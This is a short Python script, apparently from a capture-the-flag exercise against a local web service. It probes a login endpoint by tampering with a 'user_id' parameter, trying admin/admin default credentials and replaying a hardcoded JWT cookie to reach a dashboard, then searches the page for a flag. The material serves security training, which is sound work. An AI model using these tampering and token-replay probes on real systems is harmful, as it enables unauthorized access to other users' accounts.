import requests
import re

BASE_URL = "http://127.0.0.1:32883"
PASSWORD_TEST_URL = f"{BASE_URL}/password/test"

# Test the baseline behavior with known working credentials
print("[*] Testing baseline authentication behavior\n")

# Test 1: Normal authentication with known credentials
print("[TEST 1] Normal POST with username=test, password=test")
data1 = {
    'username': 'test',
    'password': 'test'
}
resp1 = requests.post(PASSWORD_TEST_URL, data=data1, allow_redirects=False)
print(f"Status: {resp1.status_code}")
print(f"Headers: {dict(resp1.headers)}")
print(f"Cookies: {dict(resp1.cookies)}")
print(f"Response length: {len(resp1.text)}B")
print(f"Response: {resp1.text[:500]}")

print("\n" + "="*60 + "\n")

# Test 2: With user_id parameter added
print("[TEST 2] POST with username=test, password=test, user_id=10032")
data2 = {
    'username': 'test',
    'password': 'test',
    'user_id': '10032'
}
resp2 = requests.post(PASSWORD_TEST_URL, data=data2, allow_redirects=False)
print(f"Status: {resp2.status_code}")
print(f"Headers: {dict(resp2.headers)}")
print(f"Cookies: {dict(resp2.cookies)}")
print(f"Response length: {len(resp2.text)}B")
print(f"Response: {resp2.text[:500]}")

print("\n" + "="*60 + "\n")

# Test 3: Try a different user_id
print("[TEST 3] POST with username=test, password=test, user_id=1")
data3 = {
    'username': 'test',
    'password': 'test',
    'user_id': '1'
}
resp3 = requests.post(PASSWORD_TEST_URL, data=data3, allow_redirects=False)
print(f"Status: {resp3.status_code}")
print(f"Headers: {dict(resp3.headers)}")
print(f"Cookies: {dict(resp3.cookies)}")
print(f"Response length: {len(resp3.text)}B")
print(f"Response: {resp3.text[:500]}")

print("\n" + "="*60 + "\n")

# Test 4: Check if endpoint returns different response for different parameters
print("[TEST 4] POST with username=admin, password=admin")
data4 = {
    'username': 'admin',
    'password': 'admin'
}
resp4 = requests.post(PASSWORD_TEST_URL, data=data4, allow_redirects=False)
print(f"Status: {resp4.status_code}")
print(f"Headers: {dict(resp4.headers)}")
print(f"Cookies: {dict(resp4.cookies)}")
print(f"Response length: {len(resp4.text)}B")
print(f"Response: {resp4.text[:500]}")

print("\n" + "="*60 + "\n")

# Test 5: Use existing auth_token to access dashboard
print("[TEST 5] Access dashboard with existing auth_token")
cookies = {
    'auth_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs'
}
resp5 = requests.get(f"{BASE_URL}/dashboard", cookies=cookies)
print(f"Status: {resp5.status_code}")
print(f"Response length: {len(resp5.text)}B")
print(f"Response:\n{resp5.text}")

# Search for FLAG
flag_match = re.search(r'FLAG\{[^}]+\}', resp5.text)
if flag_match:
    print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")

